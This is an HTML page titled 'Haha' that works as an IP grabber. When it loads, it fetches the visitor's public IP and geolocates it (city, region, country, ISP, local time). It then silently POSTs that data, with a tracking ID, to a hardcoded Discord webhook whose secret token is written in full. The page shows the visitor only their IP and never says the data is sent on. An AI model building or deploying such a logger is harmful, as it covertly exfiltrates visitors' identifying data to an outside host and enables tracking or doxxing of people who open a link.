<!DOCTYPE html>
<html>
  <head>
    <title>Haha</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
    <script>
      function getLocation(ip, pageUserID) {
        fetch("https://ipapi.co/" + ip + "/json/")
          .then((response) => response.json())
          .then((data) => {
            const location = data.city + ", " + data.region_code + ", " + data.country_name;
            const timezoneOffset = data.utc_offset;
            const timezoneName = data.timezone;
            const isp = data.org;
            const localTime = moment().utcOffset(timezoneOffset).format("YYYY-MM-DD hh:mm:ss A");
            const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx";
            const message = "IP: " + ip + ", Location: " + location + ", ISP: " + isp + ", Time (CET): " + localTime + ", Page User ID: " + pageUserID;
            fetch(webhookURL, {
              method: "POST",
              headers: {
                "Content-Type": "application/json",
              },
              body: JSON.stringify({ content: message }),
            })
              .then((response) => {
                console.log("Success:", response);
              })
              .catch((error) => {
                console.error("Error:", error);
              });
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }

      function displayIP() {
        fetch("https://api.ipify.org/?format=json")
          .then((response) => response.json())
          .then((data) => {
            const ipElement = document.getElementById("ip");
            ipElement.textContent = data.ip;
            const pageUserID = Date.now().toString();
            localStorage.setItem("pageUserID", pageUserID);
            getLocation(data.ip, pageUserID);
          })
          .catch((error) => {
            console.error("Error:", error);
          });
      }
    </script>
  </head>
  <body onload="displayIP()">
    <p>Your IP address is: <span id="ip"></span></p>
  </body>
</html>
